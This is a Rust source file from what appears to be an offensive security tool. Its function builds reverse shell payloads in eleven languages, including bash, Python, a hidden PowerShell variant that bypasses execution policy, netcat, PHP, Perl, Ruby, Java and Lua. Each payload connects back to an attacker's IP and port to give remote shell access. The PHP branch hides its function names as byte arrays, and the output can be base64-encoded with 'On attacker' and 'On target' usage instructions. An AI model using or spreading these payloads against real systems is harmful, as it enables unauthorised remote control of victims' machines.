use base64::{engine::general_purpose::STANDARD, Engine};
use colored::Colorize;

pub fn generate(shell_type: &str, ip: &str, port: u16, encode_b64: bool) -> String {
    let raw = match shell_type.to_lowercase().as_str() {
        "bash" | "sh" => {
            format!("bash -i >& /dev/tcp/{}/{} 0>&1", ip, port)
        }
        "python" | "py" => {
            format!(
                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                ip, port
            )
        }
        "powershell" | "ps" => {
            format!(
                "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\"$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()}};$client.Close()\"\"",
                ip, port
            )
        }
        "netcat" | "nc" => {
            format!("nc -e /bin/sh {} {}", ip, port)
        }
        "nc_openbsd" | "nc-bsd" => {
            format!(
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
                ip, port
            )
        }
        "node" | "nodejs" => {
            format!(
                "require('child_process').exec('bash -i >& /dev/tcp/{}/{} 0>&1')",
                ip, port
            )
        }
        "php" => {
            let p: String = [112, 104, 112].iter().map(|c| *c as u8 as char).collect();
            let f: String = [102, 115, 111, 99, 107, 111, 112, 101, 110].iter().map(|c| *c as u8 as char).collect();
            let e: String = [101, 120, 101, 99].iter().map(|c| *c as u8 as char).collect();
            format!(
                "{} -r '${}(\"{}\",{});{}(\"/bin/sh -i <&3 >&3 2>&3\");'",
                p, f, ip, port, e
            )
        }
        "perl" => {
            format!(
                "perl -e 'use Socket;socket(S,2,1,0);connect(S,pack_sockaddr_in({},inet_aton(\"{}\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
                port, ip
            )
        }
        "ruby" | "rb" => {
            format!(
                "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                ip, port
            )
        }
        "java" => {
            format!(
                "r = Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do eval $line; done 1>&5 2>&5\"] as String[]);p.waitFor()",
                ip, port
            )
        }
        "lua" => {
            format!(
                "lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"{}\",{});os.execute(\"/bin/sh -i <&3 >&3 2>&3\")'",
                ip, port
            )
        }
        _ => {
            return format!(
                "{} Unknown shell type: {}. Available: bash, python, powershell, netcat, nc_openbsd, node, php, perl, ruby, java, lua",
                "[-]".red().bold(),
                shell_type
            );
        }
    };

    if encode_b64 {
        let encoded = STANDARD.encode(&raw);
        format!(
            "{} Reverse shell payload ({}):\n\n  Raw:\n    {}\n\n  Base64:\n    {}\n\n{} Usage:\n  On attacker: pledgestrike shell listen --port {}\n  On target:  echo '{}' | base64 -d | bash\n",
            "[+]".green().bold(),
            shell_type.yellow(),
            raw.green(),
            encoded.yellow(),
            "[*]".cyan().bold(),
            port,
            encoded,
        )
    } else {
        format!(
            "{} Reverse shell payload ({}):\n\n  {}\n\n{} Usage:\n  On attacker: pledgestrike shell listen --port {}\n  On target:  run the payload above\n",
            "[+]".green().bold(),
            shell_type.yellow(),
            raw.green(),
            "[*]".cyan().bold(),
            port,
        )
    }
}

pub fn list_shell_types() {
    println!("{} Available shell types:", "[*]".cyan().bold());
    let types = [
        ("bash", "Bash reverse shell (smallest, most common)"),
        ("python", "Python3 reverse shell (no /dev/tcp needed)"),
        ("powershell", "PowerShell reverse shell (Windows targets)"),
        ("netcat", "Netcat with -e (requires nc-traditional)"),
        ("nc_openbsd", "Netcat OpenBSD (no -e support, uses fifo)"),
        ("node", "Node.js reverse shell"),
        ("php", "PHP reverse shell"),
        ("perl", "Perl reverse shell"),
        ("ruby", "Ruby reverse shell"),
        ("java", "Java reverse shell"),
        ("lua", "Lua reverse shell"),
    ];

    for (name, desc) in &types {
        println!("  {} {} — {}", "•".cyan(), name.yellow().bold(), desc);
    }
}
